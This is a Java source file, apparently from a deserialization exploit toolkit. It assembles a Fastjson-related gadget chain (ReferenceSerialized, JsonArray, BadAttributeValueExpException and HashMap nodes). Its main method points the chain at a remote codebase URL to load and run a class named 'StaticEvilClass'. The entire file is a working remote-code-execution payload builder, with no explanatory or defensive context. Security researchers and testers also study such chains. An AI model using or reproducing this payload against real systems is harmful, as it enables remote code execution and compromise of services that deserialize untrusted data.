import common.Util;
import gadgets.BadAttrValExeNode;
import gadgets.HashMapNode;
import gadgets.JsonArrayNode;
import gadgets.ReferenceSerializedNode;

public class Fastjson4_ReferenceSerialized {
    public Object getObject ( String className,String baseUrl) throws Exception {

        Object node1 = ReferenceSerializedNode.makeGadget(className,baseUrl);
        Object node2 = JsonArrayNode.makeGadget(2,node1);
        Object node3 = BadAttrValExeNode.makeGadget(node2);
        Object[] array = new Object[]{node1,node3};
        Object node4 = HashMapNode.makeGadget(array);
        return node4;
    }

    public static void main(String[] args) throws Exception {
        Object object = new Fastjson4_ReferenceSerialized().getObject("StaticEvilClass","http://127.0.0.1:8000/");
        Util.runGadgets(object);
    }
}
